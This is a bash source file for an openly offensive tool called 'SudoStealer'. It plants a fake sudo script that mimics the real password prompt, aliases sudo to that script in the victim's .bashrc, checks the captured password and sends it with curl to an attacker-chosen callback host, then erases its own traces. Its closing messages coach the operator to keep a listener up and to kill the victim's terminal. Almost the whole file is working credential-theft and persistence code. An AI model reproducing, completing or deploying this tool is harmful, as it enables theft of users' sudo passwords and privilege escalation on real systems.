#!/bin/bash

###################################
# SudoStealer                     #
# @543hn                          #
# @rewzilla (wise giver of ideas) #
###################################

##########
# COLORS #
##########

g="\e[1;32m"
r="\e[1;31m"
rst="\e[1;0m"

##################
# GETOPT PARSING #
##################

usage() { 
	echo -e "Usage: $0"
	echo -e "\t[-m method]      \talias, path, binary"
	echo -e "\t[-d droppath]    \tpath to drop script. must be writable" 
	echo -e "\t[-p port]        \tchoose port. always HTTP traffic"  
	echo -e "\tlhost            \thost to callback to" 1>&2; exit 1; }

# Set defaults
dropperPath="/tmp/systemd-private-ddfc8895748c4607a2a16cf94c278435-colord.service-OPRl5G"
port="80"

while getopts ":m:d:p:" o; do
    case "${o}" in
        m)
	    # verify input here TODO
            m=${OPTARG} 
	    echo "assigned m"
            ;;
        d)
            d=${OPTARG}
			dropperPath=${d}
            ;;
        p)
            p=${OPTARG}
			port=${p}
	    ;;
        *)
            usage
            ;;
    esac
done
shift $((OPTIND-1))
host="$@"

if [ -z "${host}" ]; then
    usage
fi

####################
# BIG BANNER PRINT #
####################

echo -e "
\t.▄▄ · ▄• ▄▌·▄▄▄▄        .▄▄ · ▄▄▄▄▄▄▄▄ . ▄▄▄· ▄▄▌  ▄▄▄ .▄▄▄
\t▐█ ▀. █▪██▌██▪ ██ ▪     ▐█ ▀. •██  ▀▄.▀·▐█ ▀█ ██•  ▀▄.▀·▀▄ █·
\t▄▀▀▀█▄█▌▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▄█▀▀█ ██▪  ▐▀▀▪▄▐▀▀▄
\t▐█▄▪▐█▐█▄█▌██. ██ ▐█▌.▐▌▐█▄▪▐█ ▐█▌·▐█▄▄▌▐█ ▪▐▌▐█▌▐▌▐█▄▄▌▐█•█▌
\t ▀▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀  ▀▀▀  ▀  ▀ .▀▀▀  ▀▀▀ .▀  ▀
"

###################
# GENERATE SCRIPT #
###################

script='
#!/bin/bash

if [ -z $1 ]; then
	echo "usage: sudo -h | -K | -k | -V"
	echo "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]"
	echo "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]"
	echo "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]"
    echo "            [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]"
	echo "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]"
    echo "            [-T timeout] [-u user] file ..."
	exit 1
fi

inLoop=false;
exiter=false;
tries=0;

exiter() {
	if !($inLoop); then
		if (( tries > 0 )); then
			echo -e "\nsudo: $tries incorrect password attempt"
		else
			echo
		fi
		exit
	else
		exiter=true
	fi
}

trap exiter SIGINT
trap exiter SIGTSTP

while (( tries < 3 )); do
	read -sp "[sudo] password for $USER: " pw
	inLoop=true
	echo
	if [ -z $pw ]; then
		(( tries++ ))
		sleep 2.7
	elif ! (echo "$pw" | sudo -kS echo >/dev/null 2>&1); then
		(( tries++ ))
		sleep 1
	else
		pwc=$(printf "%q" "$pw")
		SEND COMMAND
		CLEANUP
		echo "$pw" | sudo -S "$@" 2>/dev/null
		# bug: wont output error if command is wrong/not found
		rm -- "$0" >/dev/null 2>&1
		exec bash
		exit 0
	fi
	inLoop=false
	if ($exiter); then
		exiter
	fi
	if (( tries < 3 )); then
		echo "Sorry, try again."
	else
		echo -e "sudo: $tries incorrect password attempt"
		exit
	fi
done
'

# Build callback command
sendCommand="curl -m 0.3 -d \"pw=\$pwc\" \"$host:$port\" >\/dev\/null 2>\&1"

# Make sense of method opt
# method 1: replace passwd binary (REQUIRES SUDO)
# method 1.5: PATH overwrite
# method 2: alias to script (DEFAULT)
# case 
# alias 
cleanupCommand="sed -i '\$ d' \"\/home\/\$USER\/.bashrc\""
# path
# binary
	# check if sudo
	# if not, exit

# Insert commands
script="$(echo "$script" | sed "s/SEND COMMAND/$sendCommand/g")"
script="$(echo "$script" | sed "s/CLEANUP/$cleanupCommand/g")"


###########
# DROPPER #
###########


echo -e "\t[${g}+${rst}] Dropper path: $dropperPath"
echo -en "\t[${g}+${rst}] Making directory $dropperPath..."
mkdir -p $dropperPath && echo -e " ${g}OK${rst}" \
		      || (echo -e "${r}ERROR${rst}"; exit)

echo -en "\t[${g}+${rst}] Copying script to $dropperPath/tmp... "
echo "$script" > "$dropperPath/tmp" && echo -e " ${g}OK${rst}" \
				    || (echo -e "${r}ERROR${rst}"; exit)

echo -en "\t[${g}+${rst}] Marking script as executable..."
chmod +x "$dropperPath/tmp" && echo -e " ${g}OK${rst}" \
		            || (echo -e "${r}ERROR${rst}"; exit)

# check METHOD
# case alias
# CHECK IF ALIAS ALREADY EXISTS
echo -en "\t[${g}+${rst}] Creating alias in /home/$USER/.bashrc..."
echo "alias sudo=$dropperPath/tmp" >> /home/$USER/.bashrc \
			&& echo -e " ${g}OK${rst}" \
			|| (echo -e "${r}ERROR${rst}"; exit)

# case path
# figure path out TODO
# case binary
# figure binary out

#echo -e "\t[${g}+${rst}] TODO force reloading of ~/.bashrc on all terminals"
# could replace bash exe in proc... hm

echo -e "\t[${g}+${rst}] ${g}DONE${rst}! Now, just wait with your listener up."
echo -e "\t    If you're antsy, pkill their terminal."
echo -e "\t    Don't forget to delete this script.\n"

